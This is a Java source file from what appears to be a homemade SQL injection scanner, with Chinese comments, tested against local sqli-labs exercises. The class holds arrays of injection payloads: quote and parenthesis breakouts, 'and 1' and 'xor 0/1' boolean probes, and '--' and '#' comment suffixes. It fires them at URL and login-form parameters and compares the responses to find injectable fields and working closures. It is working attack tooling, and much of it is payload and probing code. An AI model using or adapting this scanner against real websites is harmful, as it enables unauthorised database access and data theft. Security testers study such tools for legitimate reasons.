package com.sqldd.ifInjection;

import com.sqldd.crawler.HtmlDownloader;
import com.sqldd.crawler.MyRequestSet;
import com.sqldd.fuzzingWaf.PageComparison;
import com.sqldd.p0jo.SqlddDomain;

import java.util.ArrayList;
import java.util.HashMap;

/**
 * 判断是否存在注入点
 * 并返回类型和有效注释符
 */
public class IfInjection {
    private String [][] closures = {
            {"\"))",
            "'))",
            "\")",
            "')",
            "\"",
            "'",
            ""},{
            " and ((\"1",
            " and (('1",
            " and (\"1",
            " and ('1",
            " and \"1",
            " and '1",
            " and 1"},{
            " xor ((\"0",
            " xor (('0",
            " xor (\"0",
            " xor ('0",
            " xor \"0",
            " xor '0",
            " xor 0"},{
            " xor ((\"1",
            " xor (('1",
            " xor (\"1",
            " xor ('1",
            " xor \"1",
            " xor '1",
            " xor 1"},{
            "((\"",
            "(('",
            "(\"",
            "('",
            "\"",
            "'",
            ""}
    };
    //private String [][] closures = {{"\")","')","\"","'"},{" and (\"1", " and ('1", " and \"1"," and '1"},{" xor (\"0", " xor ('0", " xor \"0"," xor '0"},{" xor (\"1", " xor ('1", " xor \"1"," xor '1"}};
    //and 1/xor 0用于judgeInjectionDot判断是否可注入，xor 1用于filterInjectionDot筛选注入点

    public HashMap<String,String []> judgeInjectionDot(SqlddDomain sqlddDomain, HashMap<String,String> paramsOne,HashMap<String,String> paramsTwo){
        HashMap<String, String[]> map = new HashMap<String, String[]>();//{username,{',-- };password,{",#}}
        PageComparison pageComparison = new PageComparison(sqlddDomain.getUrl(),sqlddDomain.getMethod());
        HtmlDownloader htmlDownloader = new HtmlDownloader(new MyRequestSet());
        //正常结果
        ArrayList<String> normalRst = pageComparison.getNormalPageComparison(paramsOne, paramsTwo);
        for (String key : paramsOne.keySet()){
            String value = paramsOne.get(key);
            for (int i = 0; i < closures[0].length; i++) {
                HashMap<String, String> paramsTMP = new HashMap<>();
                paramsTMP.putAll(paramsOne);
                paramsTMP.put(key, value+closures[0][i]);
                //网页内容是否改变
                int ifSamepage = pageComparison.ifSamePage(sqlddDomain.getUrl(), sqlddDomain.getMethod(), paramsOne, paramsTMP);
                if(ifSamepage == 0){//网页内容改变，即报错
                    //System.out.println("疑似");
                    //加入and 1
                    HashMap<String, String> paramsTMP1 = new HashMap<>();
                    paramsTMP1.putAll(paramsOne);
                    paramsTMP1.put(key, value+closures[0][i]+closures[1][i]);
                    int ifSamapage1 = pageComparison.ifSamePage(sqlddDomain.getUrl(), sqlddDomain.getMethod(), paramsOne, paramsTMP1);
                    //加入xor 0
                    paramsTMP1.put(key, value+closures[0][i]+closures[2][i]);
                    int ifSamapage2 = pageComparison.ifSamePage(sqlddDomain.getUrl(), sqlddDomain.getMethod(), paramsOne, paramsTMP1);
                    boolean findclosure = false;
                    if(ifSamapage1 == 1 || ifSamapage2 == 1){//网页内容没改变，则找到正确的闭合符号
                        System.out.println("找到");
                        findclosure = true;
                        boolean findsuf = false;
                        String [] sufs = {" -- "," #"};
                        for (String suf : sufs) {
                            HashMap<String, String> paramsTMP2 = new HashMap<>();
                            paramsTMP2.putAll(paramsOne);
                            paramsTMP2.put(key, value+closures[0][i]+suf);
                            int rate3 = pageComparison.getRate(normalRst, paramsTMP2);
                                if(rate3 == 1){
                                findsuf = true;
                                map.put(key, new String[]{closures[0][i],suf});//找到当前key的suf
                                break;
                            }
                        }
                        if(findsuf == false){
                            map.put(key, new String[]{closures[0][i],""});//未找到当前key的suf，则为""
                            break;
                        }
                    }
                    if(findclosure == true)
                        break;
                }
            }
        }
        return map;
    }

    public String[] filterInjectionDot(SqlddDomain sqlddDomain, HashMap<String,String> paramsOne,HashMap<String,String> paramsTwo){
        HashMap<String, String[]> map = judgeInjectionDot(sqlddDomain, paramsOne, paramsTwo);
        PageComparison pageComparison = new PageComparison(sqlddDomain.getUrl(),sqlddDomain.getMethod());
        HtmlDownloader htmlDownloader = new HtmlDownloader(new MyRequestSet());
        //正常结果
        ArrayList<String> normalRst = pageComparison.getNormalPageComparison(paramsOne, paramsTwo);
        for (String key : map.keySet()) {
            HashMap<String, String> paramTMP = new HashMap<>();
            paramTMP.putAll(paramsOne);
            //找到闭合符在closures里的index，找到closures[3][index]
            int ii = -1;
            for (int i = 0; i < closures[0].length; i++) {
                if(closures[0][i].equals(map.get(key)[0])){
                    ii = i;
                    break;
                }
            }
            paramTMP.put(key, map.get(key)[0] + closures[3][ii]);
            int rate = pageComparison.getRate(normalRst, paramTMP);
            int ifSamepage = 0;
            if(sqlddDomain.getMethod().equals("get")){
                String html1 = htmlDownloader.downloadHtmlWithParamsGet(sqlddDomain.getUrl(), paramsOne);
                String html2 = htmlDownloader.downloadHtmlWithParamsGet(sqlddDomain.getUrl(), paramTMP);
                if(html1.length() == html2.length())
                    ifSamepage = 1;
            }else if(sqlddDomain.getMethod().equals("post")){
                String html1 = htmlDownloader.downloadHtmlWithParamsPost(sqlddDomain.getUrl(), paramsOne);
                System.out.println(html1);
                String html2 = htmlDownloader.downloadHtmlWithParamsPost(sqlddDomain.getUrl(), paramTMP);
                System.out.println(html2);
                if(html1.length() == html2.length())
                    ifSamepage = 1;
            }
            if(rate == 2 || ifSamepage == 1)
                return new String[]{key,map.get(key)[0],closures[4][ii],map.get(key)[1]};//返回关键字注入点，前闭合，后闭合，注释符
        }
        return null;
    }

    public static void main(String[] args) {
        IfInjection ifInjection = new IfInjection();
        /*ArrayList<String> keys = new ArrayList<>();
        keys.add("id");
        SqlddDomain sqlddDomain = new SqlddDomain("http://localhost/sqli-labs/Less-1/", "get", keys);
        HashMap<String, String> params1 = new HashMap<>();
        params1.put("id", "1");
        HashMap<String, String> params2 = new HashMap<>();
        params2.put("id", "2");
        HashMap<String, String[]> map = ifInjection.judgeInjectionDot(sqlddDomain, params1, params2);
        if(map != null){
            for (String key : map.keySet()) {
                String[] strings = map.get(key);
                System.out.println(strings[0] + "+" + strings[1]);
            }
        }*/

        ArrayList<String> keyss = new ArrayList<>();
        keyss.add("uname");
        keyss.add("passwd");
        keyss.add("submit");
        SqlddDomain sqlddDomain1 = new SqlddDomain("http://localhost/sqli-labs/Less-12/", "post", keyss);
        HashMap<String, String> params11 = new HashMap<>();
        params11.put("uname", "admin");
        params11.put("passwd", "admin");
        params11.put("submit", "Submit");
        HashMap<String, String> params22 = new HashMap<>();
        params22.put("uname", "admin1");
        params22.put("passwd", "admin1");
        params22.put("submit", "Submit");
        /*HashMap<String, String[]> map1 = ifInjection.judgeInjectionDot(sqlddDomain1, params11, params22);
        if(map1 != null){
            for (String key : map1.keySet()) {
                String[] strings = map1.get(key);
                System.out.println(key+strings[0] + "+" + strings[1]);
            }
        }*/
        String[] strings = ifInjection.filterInjectionDot(sqlddDomain1, params11, params22);
        for (String string : strings) {
            System.out.println(string);
        }

        for (int i = 0; i < ifInjection.closures[0].length; i++) {
            System.out.println(ifInjection.closures[0][i] + "  " + ifInjection.closures[1][i] + "  " + ifInjection.closures[2][i] + "  " + ifInjection.closures[3][i] + "  ");
        }
    }
}
